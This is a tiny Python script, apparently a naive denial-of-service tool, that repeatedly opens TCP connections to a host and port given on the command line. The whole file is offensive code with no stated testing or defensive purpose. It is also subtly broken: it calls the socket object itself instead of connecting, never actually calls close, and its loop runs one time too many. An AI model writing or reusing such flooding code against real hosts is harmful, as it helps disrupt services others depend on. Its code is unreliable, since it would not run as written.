import socket, sys

length = 0

def DoS(address, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client(str(address), int(port))
    client.close

while(length <= int(sys.argv[3])):
    DoS(sys.argv[1], sys.argv[2])
    length += 1
